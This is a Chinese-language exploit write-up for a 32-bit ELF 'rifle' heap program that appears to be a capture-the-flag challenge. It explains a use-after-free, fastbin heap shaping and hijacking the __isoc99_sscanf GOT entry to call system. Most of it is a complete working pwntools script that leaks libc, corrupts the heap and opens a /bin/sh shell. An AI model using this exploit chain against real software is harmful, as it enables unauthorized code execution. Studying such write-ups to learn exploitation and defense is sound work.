# 漏洞利用文档

## 执行环境
- **程序类型**: 32位ELF二进制程序，使用GLIBC 2.23或类似版本。
- **安全机制分析**:
  - **Stack Canary**: 启用（通过`__readgsdword(0x14u)`检查），但在漏洞利用中被绕过。
  - **NX**: 启用，但exp通过GOT劫持重用现有代码段，避免执行shellcode。
  - **ASLR**: 启用，但通过泄露libc地址计算基址绕过。
  - **PIE**: 未启用，GOT和程序基址固定（0x8048000）。
- **依赖需求**: 依赖libc和ld-linux.so，需在相同环境运行或使用patchelf调整。
- **运行环境**: Linux x86，使用ptrace进行调试，需相应权限。

## 漏洞成因
- **关键结构体**: 程序使用单向链表管理步枪节点，每个节点通过`malloc(0x38)`分配（实际大小0x40包括元数据）。结构如下：
  - 偏移0x00: 描述字段（56字节）
  - 偏移0x25: 名称字段（56字节）  
  - 偏移0x34: 下一个节点指针（4字节）
- **漏洞类型**: Use-After-Free (UAF) 结合堆溢出。
  - **根本原因**: 在`sub_8048810`释放链表节点时，虽然调用`free`释放堆块，但全局链表头指针未及时清空，导致UAF。同时，通过堆操作可覆盖释放堆块的fd指针，进行fastbin攻击。
  - **触发点**: 
    - 在`sub_8048644`中，`fgets`读取56字节到56字节缓冲区，无溢出，但通过UAF和堆布局操纵实现利用。
    - 在`sub_80487B4`中，`fgets`读取128字节到固定缓冲区（0x804a2c0），但exp通过伪造堆块大小触发fastbin攻击。

## 漏洞利用过程
利用过程通过堆风水、fastbin攻击和GOT劫持实现，关键内存变化如下：

| 步骤 | 操作 | 堆变化 | 全局变量变化 | GOT变化 | 目的 |
|------|------|--------|-------------|---------|------|
| 1 | `addRifle`注入GOT地址 | 堆块0x8239410写入puts的GOT地址0x804a248 | 链表头指向0x8239418，计数器为1 | 无变化 | 为libc泄露做准备 |
| 2 | `leakLibc`泄露地址 | 无变化 | 无变化 | 无变化 | 获取libc基址，计算system地址 |
| 3 | `addRifles(0x3f)`堆风水 | 大量堆分配和释放，塑造fastbin链 | 计数器更新为64，链表清空 | 无变化 | 为fastbin攻击创造堆布局 |
| 4 | `addRifle`注入消息指针 | 堆块0x8239458写入消息指针地址0x804a2a8 | 链表头指向0x8239458，计数器为65 | 无变化 | 控制全局变量区 |
| 5 | `leaveMessage`伪造大小 | 消息缓冲区写入伪造堆块大小0x81 | 消息缓冲区指针指向0x804a2c0 | 无变化 | 准备fastbin攻击 |
| 6 | `orderRifles`释放堆块 | fastbin链指向全局变量区0x804a2a0 | 链表头清空，订单计数器为64 | 无变化 | 执行fastbin攻击 |
| 7 | `addRifle`控制GOT指针 | 重新分配堆块，消息缓冲区指针指向GOT | 链表头指向0x804a2a8，计数器为66 | 无变化 | 为GOT劫持做准备 |
| 8 | `leaveMessage`覆盖GOT | 无直接堆变化 | 消息缓冲区指针指向GOT | `__isoc99_sscanf@got.plt`覆盖为system | 完成GOT劫持 |
| 9 | 发送`/bin/sh` | 进程替换为`/bin/dash` | 所有全局变量不可访问 | 所有GOT条目失效 | 触发system执行，获得shell |

- **堆布局演变**: 初始堆通过大量分配释放（65次分配、64次释放）塑造fastbin链，最终fastbin指向全局变量区，实现任意地址分配。
- **栈变化**: 执行流从程序主循环切换到`system`调用，栈帧重建，参数`/bin/sh`注入栈中。
- **关键地址**: 
  - libc基址通过泄露puts GOT计算。
  - system地址为libc_base + libc.symbols['system']。
  - GOT条目`__isoc99_sscanf`被覆盖，因该函数在菜单输入时被调用。

## Exploit
```python
from pwn import *
from LibcSearcher import *

# 设置调试环境和二进制文件
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample18')
p = process('./data/sample18')
libc = elf.libc  # 使用本地libc，或通过LibcSearcher动态查找

def addRifle(name, desc):
    p.sendline(b'1')  # 菜单选项1：添加步枪
    p.sendline(name)  # 输入步枪名称（可能注入地址）
    p.sendline(desc)  # 输入步枪描述

def leakLibc():
    p.sendline(b'2')  # 菜单选项2：显示步枪，触发泄露
    print(p.recvuntil(b'Description: '))
    print(p.recvuntil(b'Description: '))
    leak = p.recvline()  # 读取包含GOT地址的行
    puts = u32(leak[0:4])  # 解析puts函数地址
    libc_base = puts - libc.symbols['puts']  # 计算libc基址
    return libc_base

def orderRifles():
    p.sendline(b'3')  # 菜单选项3：提交订单，释放所有堆块

def leaveMessage(content):
    p.sendline(b'4')  # 菜单选项4：留言，写入消息缓冲区
    p.sendline(content)

def addRifles(count):
    for i in range(count):
        # 添加步枪并立即提交，塑造堆布局：名称填充0x1b字节后加NULL，描述为"1593"
        addRifle(b'1'*0x1b + p32(0x0), b'1593')
        orderRifles()  # 释放堆块，增加fastbin链

# Step 1: 注入puts的GOT地址到堆块名称字段，为泄露libc做准备
addRifle(b'0'*0x1b + p32(elf.got['puts']), b'15935728')

# Step 2: 通过显示步枪功能泄露libc地址，计算system地址
libc_base = leakLibc()
system = libc_base + libc.symbols['system']

# Step 3: 执行63次堆分配和释放，塑造堆布局，使fastbin链可控
addRifles(0x3f)

# Step 4: 注入消息缓冲区指针地址到堆块，为fastbin攻击指向全局变量区做准备
addRifle(b'1'*0x1b + p32(0x804a2a8), b'15935728')

# Step 5: 在消息缓冲区写入伪造的堆块大小0x81，欺骗堆管理器
leaveMessage(p32(0)*9 + p32(0x81))

# Step 6: 提交订单释放堆块，触发fastbin攻击，修改全局链表头指针
orderRifles()

# Step 7: 重新添加步枪，分配到的堆块覆盖消息缓冲区指针，指向GOT条目
addRifle(b'15935728', p32(elf.got['__isoc99_sscanf']))

# Step 8: 通过留言功能覆盖GOT条目，将__isoc99_sscanf替换为system
leaveMessage(p32(system))

# Step 9: 发送"/bin/sh"触发system函数执行，获得shell
p.sendline(b'/bin/sh')
p.interactive()  # 进入交互模式，使用shell
```

- **利用关键点**:
  - **信息泄露**: 通过注入GOT地址到堆块并显示，泄露libc基址。
  - **堆风水**: 大量堆操作控制fastbin链，实现任意地址分配。
  - **GOT劫持**: 覆盖`__isoc99_sscanf`的GOT条目，因该函数在菜单输入时调用，触发任意命令执行。
- **可靠性**: 利用依赖固定的GOT地址和libc偏移，需匹配环境；通过堆布局操纵提高成功率。
